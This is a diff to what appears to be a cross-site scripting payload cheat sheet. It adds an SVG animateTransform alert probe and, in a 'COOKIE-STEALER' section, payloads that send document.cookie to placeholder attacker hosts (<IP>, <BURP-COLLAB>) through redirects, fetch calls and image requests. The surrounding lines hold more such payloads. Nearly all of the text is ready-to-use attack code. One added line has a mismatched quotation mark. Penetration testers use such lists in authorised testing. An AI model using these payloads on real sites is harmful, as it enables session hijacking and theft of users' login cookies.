@@ -67,6 +67,7 @@ Repeat the same procedure with the target victim
 ' + alert(1) + '
 javascript:alert(0)
 ${alert(0)}
+<svg><animateTransform onbegin=alert(1)>
 
 // JQuery $ + onhashchange #
 <iframe src="<IP>/#" onload="this.src+='<img src=0 onerror=alert(0)>'</iframe>
@@ -115,6 +116,8 @@ http://foo?&apos;-alert(1)-&apos;
 #### COOKIE-STEALER
 ```js
 
+<script>document.location="http://<IP>/?cookie="+document.cookie"</script>
+
 <script>fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie));</script>
 
 <script>fetch(https://<BURP-COLLAB>/${btoa(document.cookie)}</script>
@@ -124,6 +127,8 @@ http://foo?&apos;-alert(1)-&apos;
 <img src=0 onerror="new Image().src='https://<IP>/?cookie='+btoa(document.cookie)">
 
 <img src=0 onerror="fetch('https://<IP>/?cookie='+btoa(document.cookie))">
+
+<svg><animateTransform onbegin=fetch(`https://<BURP-COLLAB>/?cookie=`+btoa(document.cookie));>
 
 <iframe src="<IP>/#" onload="this.src +='<img src=1 onerror=document.cookie()>'" hidden="hidden"></iframe>
 
